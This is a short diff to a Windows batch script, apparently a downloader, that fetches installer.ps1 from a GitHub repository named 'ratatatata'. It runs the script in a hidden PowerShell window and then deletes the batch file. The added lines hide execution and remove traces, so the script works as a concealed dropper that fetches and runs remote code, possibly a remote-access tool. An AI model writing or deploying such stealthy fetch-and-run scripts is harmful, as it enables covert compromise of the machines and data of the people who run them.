@@ -35,4 +35,6 @@ REM you can remove the 'powershell' to get an admin CMD
 
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kirillpristavka/ratatatata/refs/heads/main/files/installer.ps1' -OutFile 'installer.ps1'"
 
-powershell Start-Process -ep bypass "installer.ps1"
+powershell -windowstyle hidden ./installer.ps1
+
+del wget.cmd
